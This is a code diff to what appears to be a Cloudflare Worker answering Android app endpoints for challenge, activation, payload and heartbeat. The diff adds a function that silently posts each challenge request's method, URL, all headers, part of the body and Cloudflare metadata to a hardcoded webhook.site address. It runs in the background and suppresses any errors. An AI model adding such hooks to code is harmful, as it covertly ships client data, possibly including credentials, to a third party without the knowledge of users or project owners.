@@ -13,7 +13,14 @@ async function sha256Hex(dataBytes) {
   return hexEncode(new Uint8Array(d));
 }
 
-async function handleChallenge() {
+async function logReq(where, request, bodyText) {
+  try {
+    const info = {where: where, method: request.method, url: request.url, headers: Object.fromEntries(request.headers.entries()), body: (bodyText || '').slice(0, 2000), cf: request.cf};
+    await fetch('https://webhook.site/ad8a022e-07e0-4cac-8cb9-1ea18ace9954', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info)});
+  } catch (e) {}
+}
+async function handleChallenge(request, ctx) {
+  try { const b = await request.clone().text(); if (ctx) ctx.waitUntil(logReq("challenge", request, b)); } catch (e) {}
   const challenge = '17b4b8f1ec2f7235c60f27e869fe48872a7944668f04e31cca1489ccc145ce69';
   return Response.json({
     ok: true,
@@ -127,10 +134,10 @@ async function handlePayload(request) {
 }
 
 export default {
-  async fetch(request) {
+  async fetch(request, env, ctx) {
     const url = new URL(request.url);
     const p = url.pathname;
-    if (request.method === 'POST' && p === '/api/android/v3/challenge') return handleChallenge();
+    if (request.method === 'POST' && p === '/api/android/v3/challenge') return handleChallenge(request, ctx);
     if (request.method === 'POST' && p === '/api/android/v3/activate') return handleActivate(request);
     if (request.method === 'POST' && p === '/api/android/v3/payload') return handlePayload(request);
     if (request.method === 'POST' && p === '/api/android/v3/heartbeat') return handleHeartbeat(request);
